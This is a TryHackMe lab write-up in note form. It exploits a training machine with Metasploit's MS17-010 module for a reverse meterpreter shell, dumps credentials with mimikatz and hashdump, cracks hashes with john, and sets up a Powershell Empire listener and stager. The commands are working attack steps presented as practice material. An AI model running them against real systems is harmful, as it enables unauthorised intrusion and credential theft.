Website [URL](https://tryhackme.com/room/rppsempire)

Powershell Empire? This is a command and control server

# Enum
want to use `msfconsole` for this whole thing

lets begin by starting the database
```bash
sudo msfdb init
msfconsole -q
```

next we will do an nmap scan
```bash
db_nmap -A --script vuln -vv -oA Empire 10.10.159.89
```

now that we have data inside our database we can check the open ports and services on the host. as well as vulnerabilities. 445 is open
```bash
services
hosts
vulns
```

based on the nmap script, this is vulnerable to MS17-010. lets run a checker
```bash
search ms17-010
use 3
options
set rhosts 10.10.159.89
exploit
```

looks like it is so lets use the proper payload now
```bash
search ms17-010
use 0
options
set rhosts 10.10.159.89
set lhost tun0
exploit
```

we get a reverse meterpreter shell since we didnt change the payload. we can do a couple of things here
```bash
getuid
sysinfo
load kiwi #loads mimikatz
creds_all #dumps creds
hashdump  #dumps hashes
```

we can crack the password
```bash
john empire.hash --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
```

lets now use Powershell Empire as intended. we can get it from [here](https://github.com/BC-SECURITY/Empire)
```bash
cd /opt
git clone https://github.com/BC-SECURITY/Empire
cd Empire
./setup/install.sh
```

lets also install the GUI version called [Starkiller](https://github.com/BC-SECURITY/Starkiller/releases)
```bash
chmod +x starkiller.AppImage
```

now lets start both Empire and Starkiller
```bash
./ps-empire server
./starkiller.AppImage
URL: localhost:1337
User: empireadmin
Pass: password123
```

in Starkiller, lets create a listener
+ create listener
+ type: http
+ host: myMachineIP
+ port: myMachinePort

lets also create a stager
+ create stager
+ type: windows/launcher_bat
+ listener: oneMadeFromAbove